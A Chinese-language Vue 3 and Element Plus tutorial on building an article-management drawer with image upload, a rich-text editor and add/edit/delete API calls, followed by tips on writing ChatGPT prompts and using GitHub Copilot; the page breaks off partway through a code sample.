 <span class="tag">&lt;/<span class="name">el-drawer</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>一打开默认重置添加的 form 表单数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultForm = {</span><br><span class="line">  <span class="attr">title</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">cate_id</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">cover_img</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">content</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">state</span>: <span class="string">''</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> formModel = <span class="title function_">ref</span>({ ...defaultForm })</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> (row.<span class="property">id</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'编辑回显'</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'添加功能'</span>)</span><br><span class="line">    formModel.<span class="property">value</span> = { ...defaultForm }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>扩展 下拉菜单 width props</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_">defineProps</span>({</span><br><span class="line">  <span class="attr">modelValue</span>: {</span><br><span class="line">    <span class="attr">type</span>: [<span class="title class_">Number</span>, <span class="title class_">String</span>]</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">width</span>: {</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span></span><br><span class="line">  }</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">&lt;el-select</span><br><span class="line"> ...</span><br><span class="line"> :style=<span class="string">"{ width }"</span></span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="上传文件-element-plus-文件预览"><a href="#上传文件-element-plus-文件预览" class="headerlink" title="上传文件 [element-plus - 文件预览]"></a>上传文件 [element-plus - 文件预览]</h3><ol><li>关闭自动上传，准备结构</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">Plus</span> } <span class="keyword">from</span> <span class="string">'@element-plus/icons-vue'</span></span><br><span class="line"></span><br><span class="line">&lt;el-upload</span><br><span class="line">  <span class="keyword">class</span>=<span class="string">"avatar-uploader"</span></span><br><span class="line">  :auto-upload=<span class="string">"false"</span></span><br><span class="line">  :show-file-list=<span class="string">"false"</span></span><br><span class="line">  :on-change=<span class="string">"onUploadFile"</span></span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-if</span>=<span class="string">"imgUrl"</span> <span class="attr">:src</span>=<span class="string">"imgUrl"</span> <span class="attr">class</span>=<span class="string">"avatar"</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-icon</span> <span class="attr">v-else</span> <span class="attr">class</span>=<span class="string">"avatar-uploader-icon"</span>&gt;</span><span class="tag">&lt;<span class="name">Plus</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span></span><br><span class="line">&lt;/el-upload&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>准备数据 和 选择图片的处理逻辑</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> imgUrl = <span class="title function_">ref</span>(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onUploadFile</span> = (<span class="params">uploadFile</span>) =&gt; {</span><br><span class="line">  imgUrl.<span class="property">value</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(uploadFile.<span class="property">raw</span>)</span><br><span class="line">  formModel.<span class="property">value</span>.<span class="property">cover_img</span> = uploadFile.<span class="property">raw</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>样式美化</li></ol><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-class">.avatar-uploader</span> {</span><br><span class="line">  :<span class="built_in">deep</span>() {</span><br><span class="line">    <span class="selector-class">.avatar</span> {</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">178px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">178px</span>;</span><br><span class="line">      <span class="attribute">display</span>: block;</span><br><span class="line">    }</span><br><span class="line">    <span class="selector-class">.el-upload</span> {</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">1px</span> dashed <span class="built_in">var</span>(--el-border-color);</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">      <span class="attribute">cursor</span>: pointer;</span><br><span class="line">      <span class="attribute">position</span>: relative;</span><br><span class="line">      <span class="attribute">overflow</span>: hidden;</span><br><span class="line">      <span class="attribute">transition</span>: <span class="built_in">var</span>(--el-transition-duration-fast);</span><br><span class="line">    }</span><br><span class="line">    <span class="selector-class">.el-upload</span><span class="selector-pseudo">:hover</span> {</span><br><span class="line">      <span class="attribute">border-color</span>: <span class="built_in">var</span>(--el-color-primary);</span><br><span class="line">    }</span><br><span class="line">    <span class="selector-class">.el-icon</span><span class="selector-class">.avatar-uploader-icon</span> {</span><br><span class="line">      <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#8c939d</span>;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">178px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">178px</span>;</span><br><span class="line">      <span class="attribute">text-align</span>: center;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="富文本编辑器-vue-quill"><a href="#富文本编辑器-vue-quill" class="headerlink" title="富文本编辑器 [ vue-quill ]"></a>富文本编辑器 [ vue-quill ]</h3><p>官网地址：<a href="https://vueup.github.io/vue-quill/">https://vueup.github.io/vue-quill/</a></p><ol><li>安装包</li></ol><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">pnpm add @vueup/vue-quill@latest</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>注册成局部组件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">QuillEditor</span> } <span class="keyword">from</span> <span class="string">'@vueup/vue-quill'</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@vueup/vue-quill/dist/vue-quill.snow.css'</span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>页面中使用绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">"editor"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">quill-editor</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">theme</span>=<span class="string">"snow"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">v-model:content</span>=<span class="string">"formModel.content"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">contentType</span>=<span class="string">"html"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">quill-editor</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>样式美化</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">.<span class="property">editor</span> {</span><br><span class="line">  <span class="attr">width</span>: <span class="number">100</span>%;</span><br><span class="line">  :<span class="title function_">deep</span>(<span class="params">.ql-editor</span>) {</span><br><span class="line">    min-<span class="attr">height</span>: 200px;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="添加文章功能"><a href="#添加文章功能" class="headerlink" title="添加文章功能"></a>添加文章功能</h3><ol><li>封装添加接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artPublishService</span> = (<span class="params">data</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">post</span>(<span class="string">'/my/article/add'</span>, data)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>注册点击事件调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form-item&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onPublish('已发布')"</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>发布<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onPublish('草稿')"</span> <span class="attr">type</span>=<span class="string">"info"</span>&gt;</span>草稿<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line">&lt;/el-form-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发布文章</span></span><br><span class="line"><span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">'success'</span>])</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onPublish</span> = <span class="keyword">async</span> (<span class="params">state</span>) =&gt; {</span><br><span class="line">  <span class="comment">// 将已发布还是草稿状态，存入 state</span></span><br><span class="line">  formModel.<span class="property">value</span>.<span class="property">state</span> = state</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 转换 formData 数据</span></span><br><span class="line">  <span class="keyword">const</span> fd = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> formModel.<span class="property">value</span>) {</span><br><span class="line">    fd.<span class="title function_">append</span>(key, formModel.<span class="property">value</span>[key])</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (formModel.<span class="property">value</span>.<span class="property">id</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'编辑操作'</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// 添加请求</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">artPublishService</span>(fd)</span><br><span class="line">    <span class="title class_">ElMessage</span>.<span class="title function_">success</span>(<span class="string">'添加成功'</span>)</span><br><span class="line">    visibleDrawer.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">    <span class="title function_">emit</span>(<span class="string">'success'</span>, <span class="string">'add'</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>父组件监听事件，重新渲染</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;article-edit ref=<span class="string">"articleEditRef"</span> @success=<span class="string">"onSuccess"</span>&gt;&lt;/article-edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加修改成功</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSuccess</span> = (<span class="params">type</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (type === <span class="string">'add'</span>) {</span><br><span class="line">    <span class="comment">// 如果是添加，需要跳转渲染最后一页，编辑直接渲染当前页</span></span><br><span class="line">    <span class="keyword">const</span> lastPage = <span class="title class_">Math</span>.<span class="title function_">ceil</span>((total.<span class="property">value</span> + <span class="number">1</span>) / params.<span class="property">value</span>.<span class="property">pagesize</span>)</span><br><span class="line">    params.<span class="property">value</span>.<span class="property">pagenum</span> = lastPage</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="添加完成后的内容重置"><a href="#添加完成后的内容重置" class="headerlink" title="添加完成后的内容重置"></a>添加完成后的内容重置</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> editorRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> (row.<span class="property">id</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'编辑回显'</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    formModel.<span class="property">value</span> = { ...defaultForm }</span><br><span class="line">    imgUrl.<span class="property">value</span> = <span class="string">''</span></span><br><span class="line">    editorRef.<span class="property">value</span>.<span class="title function_">setHTML</span>(<span class="string">''</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="编辑文章回显"><a href="#编辑文章回显" class="headerlink" title="编辑文章回显"></a>编辑文章回显</h3><p>如果是编辑操作，一打开抽屉，就需要发送请求，获取数据进行回显</p><ol><li>封装接口，根据 id 获取详情数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artGetDetailService</span> = (<span class="params">id</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">get</span>(<span class="string">'my/article/info'</span>, { <span class="attr">params</span>: { id } })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中调用渲染</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> (row.<span class="property">id</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'编辑回显'</span>)</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">artGetDetailService</span>(row.<span class="property">id</span>)</span><br><span class="line">    formModel.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">    imgUrl.<span class="property">value</span> = baseURL + formModel.<span class="property">value</span>.<span class="property">cover_img</span></span><br><span class="line">    <span class="comment">// 提交给后台，需要的是 file 格式的，将网络图片，转成 file 格式</span></span><br><span class="line">    <span class="comment">// 网络图片转成 file 对象, 需要转换一下</span></span><br><span class="line">    formModel.<span class="property">value</span>.<span class="property">cover_img</span> = <span class="keyword">await</span> <span class="title function_">imageUrlToFile</span>(imgUrl.<span class="property">value</span>, formModel.<span class="property">value</span>.<span class="property">cover_img</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'添加功能'</span>)</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>chatGPT prompt：封装一个函数，基于 axios， 网络图片地址，转 file 对象， 请注意：写中文注释</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 将网络图片地址转换为File对象</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">imageUrlToFile</span>(<span class="params">url, fileName</span>) {</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">    <span class="comment">// 第一步：使用axios获取网络图片数据</span></span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(url, { <span class="attr">responseType</span>: <span class="string">'arraybuffer'</span> });</span><br><span class="line">    <span class="keyword">const</span> imageData = response.<span class="property">data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二步：将图片数据转换为Blob对象</span></span><br><span class="line">    <span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([imageData], { <span class="attr">type</span>: response.<span class="property">headers</span>[<span class="string">'content-type'</span>] });</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第三步：创建一个新的File对象</span></span><br><span class="line">    <span class="keyword">const</span> file = <span class="keyword">new</span> <span class="title class_">File</span>([blob], fileName, { <span class="attr">type</span>: blob.<span class="property">type</span> });</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file;</span><br><span class="line">  } <span class="keyword">catch</span> (error) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'将图片转换为File对象时发生错误:'</span>, error);</span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="编辑文章功能"><a href="#编辑文章功能" class="headerlink" title="编辑文章功能"></a>编辑文章功能</h3><ol><li>封装编辑接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artEditService</span> = (<span class="params">data</span>) =&gt; request.<span class="title function_">put</span>(<span class="string">'my/article/info'</span>, data)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>提交时调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onPublish</span> = <span class="keyword">async</span> (<span class="params">state</span>) =&gt; {</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (formModel.<span class="property">value</span>.<span class="property">id</span>) {</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">artEditService</span>(fd)</span><br><span class="line">    <span class="title class_">ElMessage</span>.<span class="title function_">success</span>(<span class="string">'编辑成功'</span>)</span><br><span class="line">    visibleDrawer.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">    <span class="title function_">emit</span>(<span class="string">'success'</span>, <span class="string">'edit'</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// 添加请求</span></span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="文章删除"><a href="#文章删除" class="headerlink" title="文章删除"></a>文章删除</h2><ol><li>封装删除接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artDelService</span> = (<span class="params">id</span>) =&gt; request.<span class="title function_">delete</span>(<span class="string">'my/article/info'</span>, { <span class="attr">params</span>: { id } })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中添加确认框调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onDeleteArticle</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">ElMessageBox</span>.<span class="title function_">confirm</span>(<span class="string">'你确认删除该文章信息吗？'</span>, <span class="string">'温馨提示'</span>, {</span><br><span class="line">    <span class="attr">type</span>: <span class="string">'warning'</span>,</span><br><span class="line">    <span class="attr">confirmButtonText</span>: <span class="string">'确认'</span>,</span><br><span class="line">    <span class="attr">cancelButtonText</span>: <span class="string">'取消'</span></span><br><span class="line">  })</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">artDelService</span>(row.<span class="property">id</span>)</span><br><span class="line">  <span class="title class_">ElMessage</span>({ <span class="attr">type</span>: <span class="string">'success'</span>, <span class="attr">message</span>: <span class="string">'删除成功'</span> })</span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="ChatGPT-Copilot"><a href="#ChatGPT-Copilot" class="headerlink" title="ChatGPT &amp; Copilot"></a>ChatGPT &amp; Copilot</h1><h2 id="AI-的认知-讲解内容说明"><a href="#AI-的认知-讲解内容说明" class="headerlink" title="AI 的认知 &amp; 讲解内容说明"></a>AI 的认知 &amp; 讲解内容说明</h2><p>认知同步：</p><ol><li>AI 早已不是新事物 (接受)  =&gt;  语音识别，人脸识别，无人驾驶，智能机器人…    (包括 ChatGPT 也是研发了多年的产物)</li><li>AI 本质是智能工具 (认识)  =&gt;  人工智能辅助，可以提升效率，但不具备思想意识，无法从零到一取代人类工作</li><li>AI 一定会淘汰掉一部分人  =&gt;  逆水行舟，不进则退；学会拥抱变化，尽早上车</li></ol><p>两个工具：</p><ol><li><p>ChatGPT 3.5 的使用   (4.0 使用方式一致，回答准确度更高，但付费，且每3小时，有次数限制)</p><ol><li><p>正常注册流程  (IP限制，手机号限制)</p></li><li><p>三方整合产品</p><ul><li><p>谷歌搜索：chatgpt 免费网站列表</p></li><li><p><a href="https://github.com/LiLittleCat/awesome-free-chatgpt">https://github.com/LiLittleCat/awesome-free-chatgpt</a></p></li></ul></li></ol></li><li><p>工具 Github Copilot 智能生成代码</p></li></ol><h2 id="ChatGPT-的基本使用-Prompt-优化"><a href="#ChatGPT-的基本使用-Prompt-优化" class="headerlink" title="ChatGPT 的基本使用 - Prompt 优化"></a>ChatGPT 的基本使用 - Prompt 优化</h2><p>AI 互动的过程中，容易出现的问题：</p><ul><li>AI未能理解问题的核心要点</li><li>AI的回答过于宽泛 或 过于具体</li><li>AI提供了错误的信息或观点</li><li>AI未能提供有价值的建议或解决方案</li></ul><p>在识别了问题所在之后，我们可以尝试以下策略来优化我们的Prompt：</p><ul><li><p><strong>明确提问</strong>：</p><p>确保问题表述清晰明确，关键字的准确度，决定了AI 对于需求的理解。</p></li><li><p><strong>细化需求：</strong></p><p>将问题拆分成多个小问题，可以帮助AI更具针对性地回答，也利于即时纠错。</p></li><li><p><strong>添加背景信息：</strong></p><p>提供有关问题背景的详细信息，也可以给 AI 预设一个角色，将有助于AI生成更具深度和价值的回答。</p></li><li><p><strong>适当引导：</strong></p><p>比如：“例如”、“请注意”、“请使用”等，来告诉模型你期望它做什么 或者 不做什么</p></li><li><p><strong>限制范围：</strong></p><p>通过限定回答的范围和长度，可以引导AI生成更精炼的回答</p></li></ul><p>​…</p><h3 id="案例-前端简历"><a href="#案例-前端简历" class="headerlink" title="案例 - 前端简历"></a>案例 - 前端简历</h3><h4 id="Prompt-优化前："><a href="#Prompt-优化前：" class="headerlink" title="Prompt 优化前："></a>Prompt 优化前：</h4><p>Prompt1:  </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">前端简历</span><br></pre></td></tr></tbody></table></figure><h4 id="Prompt-优化后："><a href="#Prompt-优化后：" class="headerlink" title="Prompt 优化后："></a>Prompt 优化后：</h4><p>Prompt1:  </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">背景：你是一名【具有三年开发经验】的前端开发工程师，这三年期间，前两年，你做的【金融】相关四个项目，最后一年做的是【医疗】相关领域的两个项目，且有一定的管理 10人+ 团队的经验。主要的技术栈：【Vue】 和 【小程序】。由于你是计算机软件工程专业，所以你具备一些Java后台、Mysql数据库的知识，也掌握一些基础的算法。</span><br><span class="line"></span><br><span class="line">问题：你会如何编写你的简历个人技能介绍</span><br><span class="line"></span><br><span class="line">要求：8条技能介绍，请注意：你不会 angular。</span><br></pre></td></tr></tbody></table></figure><p>Prompt2：</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">基于上文情境，你会如何编写你的项目经验介绍</span><br></pre></td></tr></tbody></table></figure><p>Prompt3：</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">你刚才说的方向完全没有问题，但是我想看到更多的项目技术亮点，项目业务解决方案。</span><br><span class="line">请注意：每个项目<span class="number">3</span>个技术亮点，<span class="number">3</span>个业务解决方案。</span><br></pre></td></tr></tbody></table></figure><h2 id="工具-Github-Copilot-智能生成代码的使用"><a href="#工具-Github-Copilot-智能生成代码的使用" class="headerlink" title="工具 Github Copilot 智能生成代码的使用"></a>工具 Github Copilot 智能生成代码的使用</h2><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ul><li>登录 github，试用 Copilot</li><li>打开 vscode， 搜索并安装插件 Copilot</li></ul><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><ul><li>删除键：不接受</li><li>Tab键：接收</li><li>Ctrl + enter： 查看更多方案</li></ul><h2 id="个人中心项目实战-基本资料"><a href="#个人中心项目实战-基本资料" class="headerlink" title="个人中心项目实战 - 基本资料"></a>个人中心项目实战 - 基本资料</h2><h3 id="静态结构-校验处理"><a href="#静态结构-校验处理" class="headerlink" title="静态结构 + 校验处理"></a>静态结构 + 校验处理</h3><p>chatgpt prompt 提示词参考：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">请基于 elementPlus 和 Vue3 的语法，生成组件代码</span><br><span class="line">要求：</span><br><span class="line">一、表单结构要求</span><br><span class="line">1.  组件中包含一个el-form表单，有四行内容，前三行是输入框，第四行是按钮</span><br><span class="line">2. 第一行 label 登录名称，输入框禁用不可输入状态</span><br><span class="line">3. 第二行 label 用户昵称，输入框可输入</span><br><span class="line">4. 第三行 label 用户邮箱，输入框可输入</span><br><span class="line">5. 第四行按钮，提交修改</span><br><span class="line"></span><br><span class="line">二、校验需求</span><br><span class="line">给昵称 和 邮箱添加校验</span><br><span class="line">1. 昵称 nickname 必须是2-10位的非空字符串</span><br><span class="line">2. 邮箱 email 符合邮箱格式即可，且不能为空</span><br></pre></td></tr></tbody></table></figure><p>参考目标代码：</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { useUserStore } <span class="keyword">from</span> <span class="string">'@/stores'</span></span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> {</span><br><span class="line">  <span class="attr">user</span>: { username, nickname, email, id }</span><br><span class="line">} = <span class="title function_">useUserStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userInfo = <span class="title function_">ref</span>({ username, nickname, email, id })</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rules = {</span><br><span class="line">  <span class="attr">nickname</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入用户昵称'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{2,10}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'昵称必须是2-10位的非空字符串'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">email</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入用户邮箱'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    { <span class="attr">type</span>: <span class="string">'email'</span>, <span class="attr">message</span>: <span class="string">'邮箱格式不正确'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> }</span><br><span class="line">  ]</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">page-container</span> <span class="attr">title</span>=<span class="string">"基本资料"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"12"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:model</span>=<span class="string">"userInfo"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:rules</span>=<span class="string">"rules"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">"formRef"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">label-width</span>=<span class="string">"100px"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">size</span>=<span class="string">"large"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"登录名称"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"userInfo.username"</span> <span class="attr">disabled</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"用户昵称"</span> <span class="attr">prop</span>=<span class="string">"nickname"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span 